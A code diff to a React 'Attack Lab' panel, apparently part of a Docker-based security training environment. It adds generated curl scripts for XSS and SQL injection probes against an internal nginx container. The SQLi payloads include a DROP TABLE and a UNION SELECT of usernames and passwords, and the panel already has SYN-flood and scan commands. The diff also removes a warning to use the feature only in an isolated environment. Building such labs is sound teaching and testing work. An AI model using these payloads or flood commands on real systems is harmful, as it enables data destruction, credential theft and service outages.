@@ -42,6 +42,30 @@ echo "[+] Burst complete"`;
       return `# SYN Flood (hping3) - ${rps} pps to nginx:80
 hping3 -S --flood -V -p 80 nginx`;
 
+    case 'xss_probe':
+      return `# XSS Injection Probe
+echo "[*] Testing XSS payloads against /api/posts..."
+for payload in '<script>alert(1)</script>' '<img onerror=alert(1) src=x>' 'javascript:alert(1)' '<iframe src="javascript:alert(1)">' '<body onload=alert(1)>'; do
+  echo ">>> Testing: $payload"
+  curl -s -X POST http://nginx:80/api/posts \\
+    -H "Content-Type: application/json" \\
+    -d "{\\"title\\":\\"test\\",\\"content\\":\\"$payload\\"}" \\
+    -w "\\nHTTP %{http_code}\\n"
+  echo "---"
+done
+echo "[+] XSS probe complete"`;
+
+    case 'sqli_probe':
+      return `# SQL Injection Probe
+echo "[*] Testing SQLi payloads against /api/posts..."
+for payload in "' OR 1=1 --" "' UNION SELECT null,null,null --" "'; DROP TABLE posts; --" "' AND 1=0 UNION SELECT username,password FROM users --"; do
+  echo ">>> Testing: $payload"
+  curl -s "http://nginx:80/api/posts?search=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" \\
+    -w "\\nHTTP %{http_code}\\n"
+  echo "---"
+done
+echo "[+] SQLi probe complete"`;
+
     case 'nmap_scan':
       return `# Nmap Service Scan - all containers on 172.28.0.0/16
 echo "[*] Quick scan of Docker network..."
@@ -77,7 +101,25 @@ timeout ${duration} tcpdump -i any -n -c 100 'host nginx' -A 2>/dev/null || echo
   }
 }
 
-function DDoSControl({ onSendCommand, terminalMode }) {
+const ATTACK_TYPES = [
+  { group: 'DDoS Attacks', items: [
+    { value: 'flood',     label: 'HTTP Flood (curl)' },
+    { value: 'slowloris', label: 'Slowloris (nc)' },
+    { value: 'burst',     label: 'Burst (curl)' },
+    { value: 'syn_flood', label: 'SYN Flood (hping3)' },
+  ]},
+  { group: 'Injection Attacks', items: [
+    { value: 'xss_probe', label: 'XSS Injection Probe' },
+    { value: 'sqli_probe', label: 'SQL Injection Probe' },
+  ]},
+  { group: 'Recon & Scanning', items: [
+    { value: 'nmap_scan',       label: 'Nmap Service Scan' },
+    { value: 'recon',           label: 'Full Recon (dig+nmap+ssl+curl)' },
+    { value: 'tcpdump_capture', label: 'Packet Capture (tcpdump)' },
+  ]},
+];
+
+function DDoSControl({ onSendCommand }) {
   const [type, setType] = useState('flood');
   const [rps, setRps] = useState(10);
   const [concurrency, setConcurrency] = useState(5);
@@ -98,23 +140,14 @@ function DDoSControl({ onSendCommand, terminalMode }) {
   }, [running]);
 
   const handleStart = async () => {
-    if (terminalMode) {
-      // 터미널 모드: 명령어를 터미널에 전송
-      const cmd = generateCommand(type, rps, concurrency, duration);
-      if (onSendCommand) onSendCommand(cmd);
-      return;
-    }
-
-    // 바이패스 모드: API로 직접 시뮬레이션 시작
     try {
+      // Start simulation via API
       await api.post('/traffic/simulate/start', { type, rps, concurrency, duration_sec: duration });
       setRunning(true);
 
-      // 터미널에도 해당 명령어 표시
-      if (onSendCommand) {
-        const cmd = generateCommand(type, rps, concurrency, duration);
-        onSendCommand(`# [바이패스 모드] 아래 명령어가 실행되었습니다:\n${cmd}`);
-      }
+      // Also send command to terminal for visibility
+      const cmd = generateCommand(type, rps, concurrency, duration);
+      if (onSendCommand) onSendCommand(cmd);
     } catch (e) {
       console.error('Simulation start failed:', e);
     }
@@ -132,87 +165,62 @@ function DDoSControl({ onSendCommand, terminalMode }) {
     }
   };
 
+  const isRecon = ['nmap_scan', 'recon', 'tcpdump_capture'].includes(type);
+  const isInjection = ['xss_probe', 'sqli_probe'].includes(type);
+
   return (
     <div className="ddos-control">
       <div className="ddos-header" onClick={() => setCollapsed(!collapsed)}>
-        <span>{collapsed ? '▶' : '▼'}</span>
-        <span className="ddos-title">Attack & Recon Lab</span>
+        <span>{collapsed ? '\u25B6' : '\u25BC'}</span>
+        <span className="ddos-title">Attack Lab</span>
         {running && <span className="ddos-running-indicator" />}
       </div>
 
       {!collapsed && (
         <div className="ddos-body">
-          <div className="ddos-warning">
-            ⚠️ 이 기능은 격리된 Docker 환경 내에서만 사용하세요
-          </div>
-
           <div className="ddos-controls">
             <div className="control-group">
               <label>Attack Type</label>
               <select value={type} onChange={e => setType(e.target.value)} disabled={running}>
-                <optgroup label="DDoS Attacks">
-                  <option value="flood">HTTP Flood (curl)</option>
-                  <option value="slowloris">Slowloris (nc)</option>
-                  <option value="burst">Burst (curl)</option>
-                  <option value="syn_flood">SYN Flood (hping3)</option>
-                </optgroup>
-                <optgroup label="Recon & Scanning">
-                  <option value="nmap_scan">Nmap Service Scan</option>
-                  <option value="recon">Full Recon (dig+nmap+ssl+curl)</option>
-                  <option value="tcpdump_capture">Packet Capture (tcpdump)</option>
-                </optgroup>
+                {ATTACK_TYPES.map(g => (
+                  <optgroup key={g.group} label={g.group}>
+                    {g.items.map(i => (
+                      <option key={i.value} value={i.value}>{i.label}</option>
+                    ))}
+                  </optgroup>
+                ))}
               </select>
             </div>
 
-            <div className="control-group">
-              <label>RPS: {rps}</label>
-              <input
-                type="range"
-                min="1"
-                max="100"
-                value={rps}
-                onChange={e => setRps(parseInt(e.target.value))}
-                disabled={running}
-              />
-            </div>
-
-            <div className="control-group">
-              <label>Concurrency: {concurrency}</label>
-              <input
-                type="range"
-                min="1"
-                max="50"
-                value={concurrency}
-                onChange={e => setConcurrency(parseInt(e.target.value))}
-                disabled={running}
-              />
-            </div>
-
-            <div className="control-group">
-              <label>Duration: {duration}s</label>
-              <input
-                type="range"
-                min="5"
-                max="120"
-                value={duration}
-                onChange={e => setDuration(parseInt(e.target.value))}
-                disabled={running}
-              />
-            </div>
+            {!isRecon && !isInjection && (
+              <>
+                <div className="control-group">
+                  <label>RPS: {rps}</label>
+                  <input type="range" min="1" max="100" value={rps}
+                    onChange={e => setRps(parseInt(e.target.value))} disabled={running} />
+                </div>
+                <div className="control-group">
+                  <label>Concurrency: {concurrency}</label>
+                  <input type="range" min="1" max="50" value={concurrency}
+                    onChange={e => setConcurrency(parseInt(e.target.value))} disabled={running} />
+                </div>
+                <div className="control-group">
+                  <label>Duration: {duration}s</label>
+                  <input type="range" min="5" max="120" value={duration}
+                    onChange={e => setDuration(parseInt(e.target.value))} disabled={running} />
+                </div>
+              </>
+            )}
           </div>
 
           <div className="ddos-actions">
             {!running ? (
               <button className="btn-attack" onClick={handleStart}>
-                {terminalMode
-                  ? '📝 터미널에 명령어 전송'
-                  : ['nmap_scan', 'recon', 'tcpdump_capture'].includes(type)
-                    ? '🔍 스캔 실행'
-                    : '⚡ 공격 시작'}
+                {isRecon ? '\uD83D\uDD0D Scan' : isInjection ? '\uD83D\uDC89 Inject' : '\u26A1 Attack'}
               </button>
             ) : (
               <button className="btn-stop" onClick={handleStop}>
-                ⏹ 중지
+                \u23F9 Stop
               </button>
             )}
           </div>
